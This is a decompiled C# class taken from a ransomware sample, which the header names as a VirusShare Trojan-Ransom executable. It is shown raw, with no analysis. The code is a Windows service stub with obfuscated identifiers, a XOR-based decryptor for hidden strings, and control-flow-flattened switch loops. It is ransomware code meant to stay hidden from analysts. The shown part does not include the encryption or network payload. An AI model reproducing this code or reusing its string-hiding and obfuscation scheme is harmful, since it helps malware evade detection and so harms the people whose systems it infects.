// Decompiled with JetBrains decompiler
// Type: Ⴃ.ႳႥ
// Assembly: mac, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4DC2FD3D-9120-41A8-AE25-CC48D06B9902
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-4340105078ffe071abe405ad3dc31e12fd66187057ce4929d7c0f635218805af.exe

using System;
using System.ComponentModel;
using System.Reflection;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;

namespace Ⴃ
{
  internal sealed class ႳႥ : ServiceBase
  {
    private ႤႳ.Ⴄ Ⴍ = new ႤႳ.Ⴄ();
    private static readonly object Ⴄ;
    private static readonly object Ⴐ = (object) new char[207]
    {
      '⧮',
      '⧦',
      '⧮',
      '㎫',
      '᳸',
      'ॲ',
      '☃',
      '⍫',
      '㾚',
      '⸨',
      'ᏹ',
      '맱',
      '맹',
      '맰',
      '꿁',
      '븷',
      '菖',
      'ꏤ',
      '賴',
      '饼',
      '또',
      '덑',
      '欋',
      '欅',
      '欉',
      '懊',
      '紵',
      '沘',
      '兾',
      '煃',
      '幎',
      '䯅',
      '撹',
      '憞',
      '紻',
      '泋',
      '养',
      '煏',
      '幌',
      '棘',
      '棑',
      '棛',
      '犐',
      '嶟',
      '䡂',
      '朿',
      '扂',
      '纨',
      '漉',
      '勹',
      '狷',
      '㻠',
      '㻮',
      '㻤',
      'ґ',
      '⒪',
      '\u0BA7',
      'Ḩ',
      'ㅝ',
      '㐤',
      '⣔',
      '㥷',
      'ӂ',
      '⒪',
      '\u0BA7',
      'Ḫ',
      'ㄆ',
      '㐧',
      'ञ',
      'ग',
      'छ',
      'ک',
      'ϙ',
      'ώ',
      'ໞ',
      '㌳',
      'ጔ',
      '㰟',
      '⦄',
      'ۉ',
      '죘',
      '죑',
      '죞',
      '\uF2AD',
      '튐',
      '\uFDCE',
      '\uE844',
      '융',
      '쉝',
      '\uDEAC',
      '켞',
      '\uF2CF',
      'ೋ',
      'ೂ',
      'ೌ',
      'Ϳ',
      '،',
      '᪨',
      'ଋ',
      '㛦',
      'ᛁ',
      '㧊',
      'ⱑ',
      '̜',
      '궰',
      '궹',
      '궸',
      '韌',
      '럿',
      '颦',
      '贬',
      'ꉝ',
      'ꜵ',
      '믄',
      'ꩶ',
      '鞧',
      '\uDE1D',
      '\uDE14',
      '\uDE14',
      '톬',
      '퓜',
      '졾',
      '\uD9DD',
      '\uE430',
      '쐗',
      '\uEB1C',
      'ﺇ',
      '퇊',
      '弳',
      '强',
      '弹',
      '故',
      '䕽',
      '樥',
      '羯',
      '僞',
      '営',
      '䥇',
      '壵',
      '攤',
      '郵',
      '郼',
      '郾',
      '齀',
      '騴',
      '蚖',
      '霵',
      '\uAAD8',
      '諿',
      'ꗴ',
      '끯',
      '鼢',
      '䘰',
      '䘸',
      '䘼',
      '屾',
      '猦',
      '暬',
      '䧝',
      '䲵',
      '偄',
      '䇶',
      '簧',
      '㰑',
      '㰉',
      '㰜',
      '⨡',
      '㮄',
      'ذ',
      '♙',
      'ज़',
      '\u1C8B',
      '㏳',
      '㛗',
      '⨥',
      '㮁',
      '٦',
      '♞',
      'ॖ',
      '᳙',
      '㏰',
      '㛔',
      '⨮',
      '㮆',
      'س',
      '♛',
      'ॖ',
      '᳛',
      '㎧',
      '㚁',
      '\uDAE2',
      '\uDAEC',
      '\uDAEC',
      '퀢',
      '쳔',
      '\uDD70',
      '\uE090',
      '사',
      '\uEFA6',
      '喝',
      '핔',
      '클',
      '쳒',
      '\uDD70',
      '\uE090',
      '사',
      '\uEFA8'
    };
    private static readonly object Ⴅ;
    internal static ႳႥ.Ⴓ Ⴃ;

    public ႳႥ() => this.Ⴗ();

    protected override void OnStart([In] string[] obj0)
    {
    }

    protected override void OnStop()
    {
    }

    internal static Type Ⴀ()
    {
      byte[] ⴐ = ႷႨ.Ⴐ;
      return ႤႰ.Ⴈ();
    }

    protected override void Dispose([In] bool obj0)
    {
      int num = 3;
      while (true)
      {
        switch (num)
        {
          case 0:
            goto label_5;
          case 1:
          case 4:
          case 5:
            num = this.Ⴍ.Ⴄ == null ? 0 : 2;
            continue;
          case 2:
          case 6:
            goto label_4;
          default:
            num = !obj0 ? 0 : 5;
            continue;
        }
      }
label_4:
      this.Ⴍ.Ⴄ.Dispose();
label_5:
      base.Dispose(obj0);
    }

    private void Ⴗ()
    {
      this.Ⴍ.Ⴄ = (object) new Container() as IContainer;
      ႳႰ.Ⴄ<ServiceBase, string>((ServiceBase) this, ႭႭ.Ⴈ(typeof (ႷႣ), 6L, 4, 1951761893), (short) 847, '̧');
    }

    static ႳႥ()
    {
      char[] chArray = new char[8]
      {
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        '㩄',
        char.MinValue,
        char.MinValue
      };
      chArray[4] = '᩼';
      chArray[6] = 'ޣ';
      chArray[0] = '\u0AF3';
      chArray[2] = '\u20FF';
      chArray[1] = '྄';
      chArray[7] = 'ᘆ';
      chArray[3] = '㕳';
      ႳႥ.Ⴅ = (object) new string[15];
      ႳႥ.Ⴄ = (object) chArray;
      ႳႣ.Ⴅ();
    }

    internal static string Ⴍ([In] int obj0, [In] ႳႥ obj1, [In] int obj2, [In] Assembly obj3)
    {
      char[] ⴗ = ႷႼ.Ⴗ;
      byte[] ⴐ1 = ႷႨ.Ⴐ;
label_3:
      int index1 = obj0 ^ 2076022938 ^ obj2;
      object ⴐ2 = ႳႥ.Ⴐ;
      char[] chArray1 = (char[]) ⴐ2;
      int num1 = (int) chArray1[index1];
      int index2 = (int) chArray1[index1 + 2] ^ num1;
      int num2 = 1;
      IConvertible convertible;
      int index3;
      object obj4;
      object obj5;
      object obj6;
      char ch;
      int num3;
      int num4;
      int length;
      int num5;
      while (true)
      {
        switch (num2)
        {
          case 0:
            obj6 = (object) new StringBuilder();
            ch = ((char[]) obj5)[index3];
            num3 = (int) (obj5 as char[])[index3 + 1] ^ (int) ch;
            num2 = 7;
            continue;
          case 1:
            num2 = (string) (convertible = (IConvertible) ((string[]) ႳႥ.Ⴅ)[index2]) == null ? 2 : 3;
            continue;
          case 2:
            char[] chArray2 = (char[]) ⴐ2;
            char[] ⴄ = (char[]) ႳႥ.Ⴄ;
            index3 = index1;
            obj4 = (object) ⴄ;
            obj5 = (object) chArray2;
            num2 = 0;
            continue;
          case 3:
            goto label_5;
          case 4:
            num4 = num4 << 15 | (int) ((char[]) obj5)[index3++] ^ (int) ch;
            num2 = (int) ⴗ[13] - 52218;
            continue;
          case 5:
            num2 = (num3 & 32) == 0 ? 17 : 4;
            continue;
          case 6:
            num2 = 13;
            continue;
          case 7:
            index3 += 3;
            num4 = num3 & 31 | (num3 & 65472) >> 1;
            num2 = 5;
            continue;
          case 9:
            ((string[]) ႳႥ.Ⴅ)[index2] = convertible as string;
            num2 = 11;
            continue;
          case 10:
            goto label_3;
          case 11:
            goto label_18;
          case 12:
            convertible = (IConvertible) ((StringBuilder) obj6).ToString();
            goto case 9;
          case 13:
            num2 = num5 <= num4 ? 16 : 12;
            continue;
          case 14:
          case 17:
            length = ((char[]) obj4).Length;
            num5 = 1;
            goto case 6;
          case 15:
            ++num5;
            num2 = (int) ⴗ[165] - 25701;
            continue;
          case 16:
            (obj6 as StringBuilder).Append((char) ((uint) ch ^ (uint) (obj5 as char[])[index3 + num4 - num5] ^ (uint) ((char[]) obj4)[(num5 + index3 + 17) % length]));
            num2 = (int) ⴐ1[427] - 195;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႥ.Ⴍ);
            num2 = 10;
            continue;
        }
      }
label_5:
      return convertible as string;
label_18:
      return convertible as string;
    }

    internal static Assembly Ⴜ<\u0021\u00210>([In] \u0021\u00210 obj0, [In] short obj1, [In] short obj2) where \u0021\u00210 : Type
    {
      char[] ⴗ = ႷႼ.Ⴗ;
      byte[] ⴍ = ႣႣ.Ⴍ;
label_3:
      int num1 = 0;
      int num2 = 4;
      _Assembly assembly;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 5:
            assembly = (_Assembly) obj0.Assembly;
            num2 = 9;
            continue;
          case 2:
            goto label_3;
          case 3:
          case 11:
            goto label_12;
          case 4:
            int num3;
            switch (((int) obj1 ^ (int) obj2) - 9 ^ num1)
            {
              case 0:
                num3 = (int) ⴗ[85] - 33141;
                break;
              default:
                num3 = 6;
                break;
            }
            num2 = num3;
            continue;
          case 6:
            assembly = (_Assembly) null;
            num2 = (int) ⴗ[23] - 21211;
            continue;
          case 7:
          case 8:
            num2 = (int) ⴍ[11];
            continue;
          case 9:
            ++num1;
            num2 = 4844 > 692 - 101 * 7 ? 11 : 10;
            continue;
          case 10:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (ႳႥ.Ⴜ);
            num2 = 2;
            continue;
        }
      }
label_12:
      return assembly as Assembly;
    }

    [StructLayout(LayoutKind.Explicit, Size = 414, Pack = 1)]
    private struct Ⴓ
    {
    }
  }
}
